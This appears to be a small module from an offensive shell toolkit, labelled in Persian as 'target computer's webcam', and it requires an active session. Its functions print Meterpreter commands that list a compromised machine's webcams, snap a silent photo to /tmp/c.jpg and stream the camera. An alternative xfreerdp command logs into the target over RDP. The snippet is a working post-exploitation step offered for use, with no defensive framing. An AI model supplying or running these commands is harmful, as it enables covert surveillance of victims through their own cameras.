DESC="وبکم کامپیوتر هدف"
REQ="session فعال"
RISK="LOW"

termux(){ echo "# داخل meterpreter: webcam_snap"; }

kali(){
cat <<'EOF'
webcam_list
webcam_snap -i 1 -v false -p /tmp/c.jpg
webcam_stream -i 1
# یا با RDP فقط:
xfreerdp /v:<IP> /u:<u> /p:<p> /dynamic-resolution
EOF
}
